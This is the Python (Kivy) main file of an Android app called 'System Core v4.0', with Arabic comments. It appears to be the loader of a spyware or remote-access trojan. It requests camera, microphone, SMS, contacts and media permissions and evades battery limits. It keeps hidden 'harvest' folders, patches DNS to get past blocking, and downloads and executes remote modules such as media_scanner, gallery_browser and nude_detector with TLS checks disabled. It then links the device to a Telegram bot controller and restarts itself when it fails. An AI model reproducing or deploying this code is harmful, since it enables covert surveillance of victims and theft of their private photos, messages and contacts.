# -*- coding: utf-8 -*-
import os
import sys
import threading
import importlib
import requests
import traceback
import gc
import time
import socket
import random
import hashlib
import subprocess
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== 1. تجاوز DNS (Patch) مع عناوين إضافية ==========
def _patch_dns():
    original_getaddrinfo = socket.getaddrinfo
    def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
        override = {
            'raw.githubusercontent.com': [
                '185.199.108.133', '185.199.109.133',
                '185.199.110.133', '185.199.111.133'
            ],
            'cdn.jsdelivr.net': [
                '151.101.2.229', '151.101.66.229', '151.101.130.229'
            ],
            'zaen1993.github.io': [
                '185.199.108.153', '185.199.109.153',
                '185.199.110.153', '185.199.111.153'
            ]
        }
        if host in override:
            fake_ip = random.choice(override[host])
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
        return original_getaddrinfo(host, port, family, type, proto, flags)
    socket.getaddrinfo = patched_getaddrinfo

_patch_dns()

# ========== 2. روابط index.json (مرايا متعددة + Mirror Fallback) ==========
INDEX_URLS = [
    "https://zaen1993.github.io/Android-Core/index.json",
    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",
    "https://jsd.cdn.zzko.cn/gh/Zaen1993/Android-Core@main/index.json",
    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"
]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Cache-Control': 'no-cache'
}

# ========== 3. المسارات الأساسية والمجلدات المخفية ==========
def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        p = os.path.join(base, ".sys_runtime")
    except Exception:
        p = os.path.join(os.getcwd(), ".sys_runtime")
    os.makedirs(p, exist_ok=True)
    return p

R = _get_path()
U = os.path.join(R, "updates")
os.makedirs(U, exist_ok=True)

HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
os.makedirs(HARVEST_QUEUE, exist_ok=True)

if R not in sys.path:
    sys.path.insert(0, R)

# ========== 4. الأذونات + تجاوز تحسين البطارية ==========
def _perms():
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_CONTACTS,
            Permission.READ_SMS,
            Permission.WAKE_LOCK,
            Permission.ACCESS_NETWORK_STATE,
            Permission.ACCESS_WIFI_STATE,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO"
        ])
    except Exception as e:
        print(f"Permissions error: {e}")

    try:
        from jnius import autoclass
        PowerManager = autoclass('android.os.PowerManager')
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = ctx.getSystemService(ctx.POWER_SERVICE)
        if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
            Intent = autoclass('android.content.Intent')
            intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            from android.net import Uri
            intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
            ctx.startActivity(intent)
    except Exception as e:
        print(f"Battery exemption error: {e}")

# ========== 5. تثبيت المكتبات المفقودة ديناميكياً (للـ AI) ==========
def _install_pip_packages():
    """محاولة تثبيت numpy و tflite-runtime في خلفية منفصلة (لا تؤثر على التشغيل الأساسي)"""
    try:
        # التحقق مما إذا كانت numpy مثبتة
        import numpy
    except ImportError:
        try:
            print("[AI] Installing numpy...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'numpy==1.26.4'],
                           capture_output=True, check=False)
        except Exception as e:
            print(f"[AI] Failed to install numpy: {e}")

    try:
        import tflite_runtime
    except ImportError:
        try:
            print("[AI] Installing tflite-runtime...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'tflite-runtime==2.14.0'],
                           capture_output=True, check=False)
        except Exception as e:
            print(f"[AI] Failed to install tflite-runtime: {e}")

# ========== 6. تطبيق Kivy الرئيسي ==========
class CoreApp(App):
    def build(self):
        self.title = "System Core v4.0"
        layout = BoxLayout(orientation='vertical', spacing=5)

        self.log = TextInput(
            text="", readonly=True,
            background_color=(0.02, 0.02, 0.02, 1),
            foreground_color=(0.3, 0.9, 0.3, 1),
            font_size='10sp'
        )

        btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
        copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
        copy_btn.bind(on_press=self._copy)
        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
        clear_btn.bind(on_press=self._clear)

        btns.add_widget(copy_btn)
        btns.add_widget(clear_btn)

        layout.add_widget(self.log)
        layout.add_widget(btns)

        Clock.schedule_once(self._start, 0.5)
        return layout

    def _copy(self, _):
        Clipboard.copy(self.log.text)
        self._log("Log copied to clipboard")

    def _clear(self, _):
        self.log.text = ""

    def _log(self, msg, lvl="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        def upd(dt):
            self.log.text += f"[{ts}] [{lvl}] {msg}\n"
            if len(self.log.text) > 15000:
                self.log.text = self.log.text[-8000:]
            self.log.cursor = (0, len(self.log.text))
        Clock.schedule_once(upd, 0)

    def _verify_module(self, file_path, module_name):
        """التحقق من صحة الملف (عدم فساد أو اختفاء)"""
        if not os.path.exists(file_path):
            return False
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            if len(content) < 200:
                return False
            compile(content, module_name, 'exec')
            return True
        except Exception as e:
            self._log(f"Verification error ({module_name}): {e}", "ERROR")
            return False

    def _download_safe(self, url, filename):
        """تحميل ملف مع تجربة مرايا متعددة، وفحص محتوى أساسي"""
        tmp_path = os.path.join(U, filename)
        final_path = os.path.join(R, filename)

        candidates = [url]
        if "raw.githubusercontent.com" in url:
            candidates.append(url.replace("raw.githubusercontent.com", "cdn.jsdelivr.net/gh").replace("/refs/heads/main", "@main"))
            candidates.append(url.replace("raw.githubusercontent.com", "raw.kkgithub.com"))

        for attempt in range(3):
            for current_url in candidates:
                try:
                    self._log(f"Downloading {filename} (attempt {attempt+1}) from {current_url.split('/')[2]}...")
                    resp = requests.get(current_url, headers=HEADERS, timeout=20, verify=False, stream=True)
                    if resp.status_code == 200:
                        content_chunks = []
                        total_len = 0
                        for chunk in resp.iter_content(chunk_size=8192):
                            if chunk:
                                content_chunks.append(chunk.decode('utf-8', errors='ignore'))
                                total_len += len(chunk)
                                if total_len > 5_000_000:
                                    self._log(f"File too large (>5MB), aborting.", "WARN")
                                    break
                        content = "".join(content_chunks)
                        if len(content) > 200:
                            with open(tmp_path, 'w', encoding='utf-8') as f:
                                f.write(content)
                            if self._verify_module(tmp_path, filename):
                                with open(tmp_path, 'r', encoding='utf-8') as src:
                                    content = src.read()
                                with open(final_path, 'w', encoding='utf-8') as dst:
                                    dst.write(content)
                                self._log(f"✅ {filename} downloaded successfully")
                                return True
                            else:
                                self._log(f"❌ {filename} failed verification", "ERROR")
                                return False
                except Exception as e:
                    self._log(f"Error from {current_url}: {e}", "WARN")
            time.sleep(3)
        self._log(f"❌ {filename} failed after all attempts", "ERROR")
        return False

    def _start(self, _):
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        _perms()
        self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")

        # بدء تثبيت المكتبات المفقودة في الخلفية (لعدم إبطاء التشغيل)
        threading.Thread(target=_install_pip_packages, daemon=True).start()

        # --- 1. جلب index.json (مع مرايا) ---
        all_files = []
        index_data = None
        for idx_url in INDEX_URLS:
            try:
                self._log(f"Trying index: {idx_url.split('/')[2]}...")
                resp = requests.get(idx_url, headers=HEADERS, timeout=15, verify=False)
                if resp.status_code == 200:
                    index_data = resp.json()
                    all_files = index_data.get('files', [])
                    self._log(f"📄 Found {len(all_files)} files from {idx_url.split('/')[2]}")
                    break
                else:
                    self._log(f"Index returned HTTP {resp.status_code}", "WARN")
            except Exception as e:
                self._log(f"Index error: {e}", "WARN")
        else:
            self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")

        # --- 2. تحميل الملفات (باستثناء main.py) ---
        for file_url in all_files:
            filename = file_url.split('/')[-1]
            if filename == "main.py":
                continue
            self._download_safe(file_url, filename)

        time.sleep(1)   # استقرار القرص

        # --- 3. تنظيف الموديولات القديمة من الذاكرة ---
        self._log("🧹 Cleaning memory...")
        modules_to_remove = [
            "monitor", "telegram_ui", "commands",
            "media_scanner", "daily_zipper", "gallery_browser",
            "camera_analyzer", "nude_detector"
        ]
        for mod in modules_to_remove:
            if mod in sys.modules:
                del sys.modules[mod]
        importlib.invalidate_caches()
        gc.collect()

        # --- 4. تحميل الأسرار من config.py (يتم إنشاؤه أثناء البناء) ---
        try:
            import config
            importlib.reload(config)
            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = config.load_config()
            self._log("🔐 Configuration loaded securely.")
        except Exception as e:
            self._log(f"❌ Failed to load config: {e}", "ERROR")
            # لا يمكن الاستمرار بدون أسرار
            return

        # --- 5. التأكد من وجود telegram_ui.py ---
        telegram_path = os.path.join(R, "telegram_ui.py")
        if not os.path.exists(telegram_path):
            self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
            return

        # --- 6. إقلاع النظام الأساسي ---
        try:
            import monitor
            import telegram_ui
            import commands

            # إعادة تحميل لضمان أحدث نسخة تم تحميلها
            importlib.reload(monitor)
            importlib.reload(telegram_ui)
            importlib.reload(commands)

            UI_Class = getattr(telegram_ui, 'T', None)
            if UI_Class:
                mon = monitor.M()
                # ربط الجهاز بـ "بوت قائد" ثابت باستخدام random.seed
                random.seed(mon.did)
                self._log(f"🆔 Device ID: {mon.did[:8]}... | Cluster seed set")

                # إنشاء واجهة Telegram مع تمرير الأسرار
                ui = UI_Class(
                    m=mon,
                    active_tokens=active_tokens,
                    reserve_tokens=reserve_tokens,
                    ctrl_id=ctrl_id,
                    vault_id=vault_id,
                    app_password=secret_password
                )
                mon.ui = ui
                # ربط أوامر الـ callback مع commands.ex
                mon.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, ui, mon, cid, cbq)

                ui.start()
                mon.start()
                self._log("🎉 SYSTEM ONLINE (Anti-Block Mode)", "SUCCESS")
                self._log(f"Device: {mon.did} | Model: {mon.dmd}")
                self._log(f"Active bots: {len(active_tokens)} | Reserve: {len(reserve_tokens)}")
            else:
                self._log("❌ Class 'T' missing in telegram_ui.py", "ERROR")
        except Exception as e:
            self._log(f"FATAL ERROR: {e}", "ERROR")
            self._log(traceback.format_exc(), "TRACE")
            # محاولة إعادة تشغيل الخدمة بعد 60 ثانية في حالة فشل كارثي
            Clock.schedule_once(lambda dt: self._start(None), 60)

    # ========== دالتا الحفاظ على الخدمة (Sticky Service) ==========
    def on_pause(self):
        return True

    def on_stop(self):
        self._log("App stopped. Restarting service if needed.")
        return True

if __name__ == '__main__':
    CoreApp().run()
